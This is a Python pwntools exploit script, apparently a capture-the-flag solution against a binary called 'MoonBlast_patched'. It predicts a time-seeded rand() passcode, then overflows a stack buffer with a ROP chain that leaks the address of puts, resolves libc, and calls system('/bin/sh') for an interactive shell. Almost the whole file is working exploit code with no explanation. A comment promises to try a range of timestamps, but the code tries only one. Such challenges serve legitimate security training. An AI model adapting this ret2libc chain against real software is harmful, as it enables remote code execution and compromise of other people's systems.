from pwn import *
import ctypes
import time

# Connect to the process
binary = "./MoonBlast_patched"
p = process(binary)  # Change to your binary name

elf = ELF(binary)
context.binary = binary


# Load libc for rand()
libc = ctypes.CDLL('libc.so.6')

# Get current timestamp
curr_time = int(time.time())

# Try a range of timestamps around the current time

libc.srand(curr_time)
# Generate the same random number
guess = libc.rand()


# Send the passcode
p.recvuntil(b"Please enter the passcode: ")
p.sendline(str(guess).encode())

# Check response
response = p.recvline()
if b"Invalid" not in response:
    print(f"Success! Passcode is: {guess}")
    # Now we can exploit the buffer overflow in command()
            

s = '''
b *command+72
b* puts+235
'''

gdb.attach(p, s)

p.recvuntil(b"Please enter your command: ")

ret = 0x00000000004006ae
pop_rsi = 0x0000000000400a11
pop_rdi = 0x0000000000400a13
libc = ELF('./libc.so.6')
buf1 = elf.bss() +0x500



payload = flat (
    b'A' * 0x70, # up to rbp
    buf1, # old rbp
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['command']
)

p.sendline(payload)
p.recvuntil(b"Command received!\n")
leak = int.from_bytes(p.recvuntil(b"\x7f"), 'little')
libc.address = leak - libc.sym['puts']

sys_addr = libc.sym['system']
print(hex((leak)))
print(hex(libc.address))
print(hex(sys_addr))


p.recvuntil(b"Please enter your command: ")

payload = flat (
    b'A' * 0x70, # up to rbp
    buf1, # old rbp
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym['system']
)
p.sendline(payload)
p.interactive()